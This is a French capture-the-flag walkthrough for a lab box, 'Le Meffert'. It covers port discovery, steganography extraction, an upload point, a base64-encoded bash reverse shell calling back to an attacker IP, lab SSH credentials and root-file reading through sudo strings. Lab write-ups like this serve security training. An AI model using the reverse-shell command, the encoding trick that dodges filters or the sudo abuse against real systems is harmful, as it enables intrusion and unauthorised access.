# Le Meffert - CTF Walkthrough

## Sommaire

1. [Découverte des ports inversés](#1-découverte-des-ports-inversés)
2. [Analyse Steganographie](#2-analyse-steganographie)
3. [Accès au site web](#3-accès-au-site-web)
4. [Reverse Shell encodé](#4-reverse-shell-encodé)
5. [Accès SSH avec identifiants](#5-accès-ssh-avec-identifiants)
6. [Escalade de privilèges via sudo + strings](#6-escalade-de-privilèges-via-sudo--strings)

---

## 1. Découverte des ports inversés

Lors du scan de la machine, on remarque que les ports 80 et 22 sont inversés :
- Le **port 22** sert en réalité de **serveur HTTP**.
- Le **port 80** semble ne rien renvoyer ou être filtré.

Il faut donc débloquer l'accès au **port 22 dans Firefox** (ou un autre navigateur) pour naviguer sur le site web :

```
http://<BOX_IP>:22
```

C’est là que se trouvent les images importantes, notamment `cube_gold.jpg`.

## 2. Analyse Steganographie

Extraction de données cachées dans l'image `cube_gold.jpg` :

```bash
steghide extract -sf cube_gold.jpg -p "5Uch_4_G3n1u5_cR34ToR"
```

Un fichier caché est extrait, contenant une URL :

```
http://10.10.186.117:22/my_very_secret_dir/index.php
```

## 3. Accès au site web

On se rend sur l’URL donnée. C’est un point d’injection potentiel pour uploader du code.

## 4. Reverse Shell encodé

Le serveur applique des restrictions sur les commandes, donc on encode notre payload reverse shell en base64 pour contourner :

```bash
echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC45Mi41OS85MDAxIDA+JjE=" | base64 -d | bash
```

Ce qui revient à :

```bash
sh -i >& /dev/tcp/10.8.92.59/9001 0>&1
```

On écoute sur notre machine :

```bash
nc -lvnp 9001
```

Shell obtenu ✅

## 5. Accès SSH avec identifiants

Contenu du fichier `passwd` obtenu :

```
Username: uweThePuzzleMaster
Password: i_W4N7_70_C0Ll3C7_4Ll_Pu22l35
```

Connexion SSH :

```bash
ssh uweThePuzzleMaster@10.10.186.117
# Password: i_W4N7_70_C0Ll3C7_4Ll_Pu22l35
```

## 6. Escalade de privilèges via sudo + strings

Une fois connecté, on vérifie les permissions sudo :

```bash
sudo -l
```

Résultat : `strings` peut être exécuté en tant que root sans mot de passe.

On l'utilise pour lire les fichiers protégés :

```bash
sudo strings /root/root.txt
sudo strings /home/uweThePuzzleMaster/user.txt
```

🎉 **1er Flag obtenu**
🎉 **2ème Flag obtenu**
---

🧩 **Root et User flag obtenus sur Le Meffert !**

Tu viens à bout des puzzles comme un vrai Meffert Master 🔓
